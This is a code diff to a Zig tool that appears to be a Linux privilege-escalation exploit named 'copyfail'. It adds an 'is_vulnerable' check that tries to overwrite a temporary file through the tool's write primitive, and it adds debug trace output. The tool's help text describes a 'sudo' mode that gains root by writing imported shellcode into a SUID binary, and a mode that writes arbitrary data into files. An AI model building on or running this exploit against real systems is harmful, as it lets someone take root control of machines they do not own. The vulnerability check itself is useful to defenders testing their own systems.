@@ -2,6 +2,7 @@ const std = @import("std");
 const l = std.os.linux;
 const c = @import("c");
 const shellcode = @import("shellcode");
+const builtin = @import("builtin");
 
 pub fn main(init: std.process.Init.Minimal) !void {
     const gpa = std.heap.smp_allocator;
@@ -20,6 +21,11 @@ pub fn main(init: std.process.Init.Minimal) !void {
 
     run(args, io) catch |err| {
         std.log.err("Error: {t}", .{err});
+        if (builtin.mode == .Debug) {
+            if (@errorReturnTrace()) |trace| {
+                std.debug.dumpErrorReturnTrace(trace);
+            }
+        }
     };
 }
 
@@ -60,6 +66,36 @@ fn run(args: ArgsConfig, io: std.Io) !void {
             defer file.close(io);
             _ = l.fadvise(file.handle, 0, 0, l.POSIX_FADV.DONTNEED);
         },
+        .is_vulnerable => {
+            const filename = "__copyfail_vulnerable_check__";
+            const not_vulnerable_data = "safe";
+            const vulnerable_data = "BOOM";
+            defer std.Io.Dir.cwd().deleteFile(io, filename) catch {};
+            {
+                const file = try std.Io.Dir.cwd().createFile(io, filename, .{});
+                defer file.close(io);
+                try file.writeStreamingAll(io, not_vulnerable_data);
+                l.sync();
+            }
+            const file = try std.Io.Dir.cwd().openFile(io, filename, .{});
+            defer file.close(io);
+
+            try writeBytes(file.handle, 0, vulnerable_data);
+
+            var buffer: [4]u8 = undefined;
+            _ = try file.readPositionalAll(io, &buffer, 0);
+
+            if (std.mem.eql(u8, &buffer, not_vulnerable_data)) {
+                std.log.info("System is not vulnerable", .{});
+                return;
+            } else if (std.mem.eql(u8, &buffer, vulnerable_data)) {
+                std.log.warn("System is vulnerable", .{});
+                std.process.exit(100);
+            } else {
+                std.log.err("Test data got corrupted", .{});
+                return;
+            }
+        },
         .help => return printHelp(),
     }
 }
@@ -83,6 +119,7 @@ const ArgsConfig = struct {
         sudo: struct {
             argv: []const []const u8,
         },
+        is_vulnerable: void,
         help: void,
     },
 };
@@ -94,7 +131,8 @@ fn printHelp() void {
         \\  sudo    <suid_path>   [command...]          - Runs a command as root by writing shellcode to a suid binary.
         \\                                                (the first argument of command must be the full path to program to run)
         \\  modify  <path> <data> [offset]              - Write data to the file at the given offset (default 0)
-        \\  reset   <path>                              - Reset the file to its original state
+        \\  reset   <path>                              - Reset the file to its original state  
+        \\  is_vulnerable                               - Check if the system is vulnerable by creating a temporary file
         \\  help                                        - Show this message
         \\
     ,
@@ -186,6 +224,7 @@ fn parseArgs(args: std.process.Args, gpa: std.mem.Allocator) !ArgsConfig {
             };
         },
         .help => return ArgsConfig{ .command = .help },
+        .is_vulnerable => return ArgsConfig{ .command = .is_vulnerable },
     }
 }
 
